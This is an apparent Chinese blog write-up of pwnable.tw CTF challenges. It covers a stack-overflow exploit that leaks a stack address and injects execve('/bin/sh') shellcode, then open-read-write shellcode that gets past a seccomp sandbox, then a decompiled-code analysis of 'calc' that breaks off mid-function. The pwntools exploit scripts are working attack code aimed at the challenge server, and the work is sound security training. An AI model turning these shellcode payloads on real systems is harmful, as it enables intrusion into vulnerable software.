<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="nyyyddddn,1959759892@qq.com"><title>nyyyddddn</title><meta name="description" content="可可爱爱就好~"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/logo.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo@2x.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">nyyyddddn</a></h3><div class="description"><p>可可爱爱就好~</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/nyyyddddn"><i class="fa fa-github"></i></a></li><li><a href="mailto:1959759892@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=1959759892"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> nyyyddddn,1959759892@qq.com</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/pwnable-tw/">pwnable.tw</a></h3></div><div class="post-content"><div class="card"><p><h1 id="pwnable-tw"><a href="#pwnable-tw" class="headerlink" title="pwnable.tw"></a>pwnable.tw</h1><p>持续更新</p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>检查一下保护 和查看每个段的权限发现，栈上有可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/pwntw/start$ checksec start</span><br><span class="line">[*] &#x27;/home/lhj/Desktop/pwntw/start/start&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x /home/lhj/Desktop/pwntw/start/start</span><br><span class="line">0xf7ff8000 0xf7ffc000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7ffc000 0xf7ffe000 0x00000000 r-x [vdso]</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看了下题目逻辑，有一个输出一个输入，执行完输入后，add 0x14使得esp到 0x804809d(exit)，然后ret执行 (exit)结束程序。可以发现输入大小是0x3c，是能覆盖返回地址的。如果能把栈的地址泄露出来的话，就能往栈上写shellcode，然后ret到shellcode那</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function _start:</span><br><span class="line">   0x08048060 &lt;+0&gt;:     push   esp</span><br><span class="line">   0x08048061 &lt;+1&gt;:     push   0x804809d</span><br><span class="line">   0x08048066 &lt;+6&gt;:     xor    eax,eax</span><br><span class="line">   0x08048068 &lt;+8&gt;:     xor    ebx,ebx</span><br><span class="line">   0x0804806a &lt;+10&gt;:    xor    ecx,ecx</span><br><span class="line">   0x0804806c &lt;+12&gt;:    xor    edx,edx</span><br><span class="line">   0x0804806e &lt;+14&gt;:    push   0x3a465443</span><br><span class="line">   0x08048073 &lt;+19&gt;:    push   0x20656874</span><br><span class="line">   0x08048078 &lt;+24&gt;:    push   0x20747261</span><br><span class="line">   0x0804807d &lt;+29&gt;:    push   0x74732073</span><br><span class="line">   0x08048082 &lt;+34&gt;:    push   0x2774654c</span><br><span class="line">   0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">   0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">   0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">   0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">   0x0804808f &lt;+47&gt;:    int    0x80</span><br><span class="line">   0x08048091 &lt;+49&gt;:    xor    ebx,ebx</span><br><span class="line">   0x08048093 &lt;+51&gt;:    mov    dl,0x3c</span><br><span class="line">   0x08048095 &lt;+53&gt;:    mov    al,0x3</span><br><span class="line">   0x08048097 &lt;+55&gt;:    int    0x80</span><br><span class="line">   0x08048099 &lt;+57&gt;:    add    esp,0x14</span><br><span class="line">=&gt; 0x0804809c &lt;+60&gt;:    ret</span><br></pre></td></tr></table></figure>

<p>会发现执行到ret的时候 stack上有一个栈相关的地址，可以通过栈溢出覆盖返回地址调用 write来把esp打印出来泄露这个地址，泄露完后刚刚好又能再read一次，第二次read就写shellcode，然后把返回地址修改成shellcode的起始地址(用泄露出来的地址，gdb去查看这个地址和shellcode的偏移来算shellcode的地址)，第二次read esp到返回地址之间的距离太短了，所以在返回地址后边写shellcode。shellcode的地址 &#x3D; leak_addr + 0x14(esp距离返回地址的偏移)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x08048087 &lt;+39&gt;:    mov    ecx,esp</span><br><span class="line">0x08048089 &lt;+41&gt;:    mov    dl,0x14</span><br><span class="line">0x0804808b &lt;+43&gt;:    mov    bl,0x1</span><br><span class="line">0x0804808d &lt;+45&gt;:    mov    al,0x4</span><br><span class="line">0x0804808f &lt;+47&gt;:    int    0x80</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./start&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10000</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">sa(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak_rsp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(leak_rsp))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0xb</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (u32(<span class="string">&#x27;/sh\0&#x27;</span>) , u32(<span class="string">&#x27;/bin&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(leak_rsp + <span class="number">0x14</span>) + shellcode</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>程序逻辑是，输入 0xC8 个字节的数据，然后call这个数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame fuzzy-sp</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    orw_seccomp</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">call    _printf</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    0C8h            ; nbytes</span><br><span class="line">push    offset shellcode ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, offset shellcode</span><br><span class="line">call    eax ; shellcode</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 8048548</span><br><span class="line">main endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入前有一个沙箱，可以通过orw(open read write)把flag读出来，不过这里 如果 A 为 64位的话，似乎也能绕过沙箱，好像可以通过retn去修改段寄存器的某个数据来切换处理器的运行模式，不过我是直接用shellcraft来生成orw把flag读出来的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/pwntw/orw$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10001</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_i386</span>():</span><br><span class="line">    shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">    shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">    shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">    <span class="keyword">return</span> asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_cat_i386</span>():</span><br><span class="line">    shellcode = shellcraft.i386.linux.cat2(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> asm(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = orw_cat_i386()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>先分析一下程序的功能，get_expr是输入(最多位1024字节的数据)，parse_expr会把输入的表达式计算出来，最后打印结果。bzero和init_pool这两个函数不太重要，只是初始化的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> pool[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(s, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(s, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(pool);</span><br><span class="line">    <span class="keyword">if</span> ( parse_expr((<span class="type">int</span>)s, pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对输入有一些字符限制，满足约束才能把数据读进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">get_expr</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a2 &amp;&amp; read(<span class="number">0</span>, &amp;v4, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; v4 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">43</span> || v4 == <span class="number">45</span> || v4 == <span class="number">42</span> || v4 == <span class="number">47</span> || v4 == <span class="number">37</span> || v4 &gt; <span class="number">47</span> &amp;&amp; v4 &lt;= <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v5++;</span><br><span class="line">      *(_BYTE *)(a1 + v2) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v5 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[37, 42, 43, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57]</span><br><span class="line">%*+-/0123456789</span><br></pre></td></tr></table></figure>

<p>parse_expr中，会通过查找运算符位置的方式，来划分表达式中的操作数 运算符，分别存储到两个数组中，最后丢到eval里计算结果</p>
<p>满足约束的运算符的ascii是 &lt; 48的，这里做了一个无符号的类型转换 负数转u32_int的值是 &gt; 9的，所以这段代码作用是 判断是否是一个运算符(第一次看感觉很奇怪)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned int)(*(char *)(i + inputString) - 48) &gt; 9 )</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">int</span> inputString, _DWORD *pool)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operator[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = inputString;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(operator, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + inputString) - <span class="number">48</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i + inputString - v4;</span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">      <span 